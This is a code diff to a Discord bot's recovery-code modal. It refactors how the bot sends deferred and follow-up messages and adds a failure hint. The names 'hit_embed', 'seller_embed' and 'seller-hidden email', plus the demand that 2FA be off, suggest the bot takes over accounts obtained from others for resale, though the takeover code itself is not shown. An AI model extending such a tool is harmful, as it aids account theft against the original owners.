@@ -4,6 +4,7 @@ import logging
 
 from securing.recovery_secure import recovery_secure
 from securing.build_embeds import add_credential_line_field, build_failure_embed
+from shared import interactions
 
 log = logging.getLogger(__name__)
 
@@ -54,9 +55,9 @@ class recoveryCodeModal(ui.Modal):
         email = self.children[0].value
         recovery_code = self.children[1].value
 
-        await interaction.response.defer(ephemeral=True)
+        await interactions.defer(interaction, ephemeral=True)
 
-        await interaction.followup.send(
+        await interactions.followup(interaction,
             embed=discord.Embed(
                 title="Securing Account",
                 description="Your account is being secured...",
@@ -81,21 +82,21 @@ class recoveryCodeModal(ui.Modal):
                 {},
                 "An unexpected error occurred during securing.",
             )
-            await interaction.followup.send(embed=fail_embed, ephemeral=True)
+            await interactions.followup(interaction, embed=fail_embed, ephemeral=True)
             if not await _send_failure_dm(interaction.user, fail_embed):
-                await interaction.followup.send("Could not DM you — enable DMs from server members.", ephemeral=True)
+                await interactions.followup(interaction, "Could not DM you — enable DMs from server members.", ephemeral=True)
             return
 
         if isinstance(account, dict) and account.get("failed"):
             # /secure is admin — show current primary (sunny@), not seller-hidden email
             fail_embed = account.get("hit_embed") or account.get("seller_embed")
-            await interaction.followup.send(embed=fail_embed, ephemeral=True)
+            await interactions.followup(interaction, embed=fail_embed, ephemeral=True)
             if not await _send_failure_dm(interaction.user, fail_embed):
-                await interaction.followup.send("Could not DM you — enable DMs from server members.", ephemeral=True)
+                await interactions.followup(interaction, "Could not DM you — enable DMs from server members.", ephemeral=True)
             return
 
         if account == "invalid":
-            await interaction.followup.send(
+            await interactions.followup(interaction,
                 embed = discord.Embed(
                     title = "Failed to secure account",
                     description = "Invalid Recovery Code",
@@ -110,8 +111,9 @@ class recoveryCodeModal(ui.Modal):
                 email,
                 {},
                 "Make sure your recovery code is correct and that 2FA is disabled",
+                hint="Make sure your recovery code is correct and that 2FA is disabled.",
             )
-            await interaction.followup.send(embed=fail_embed, ephemeral=True)
+            await interactions.followup(interaction, embed=fail_embed, ephemeral=True)
             await _send_failure_dm(interaction.user, fail_embed)
             return
 
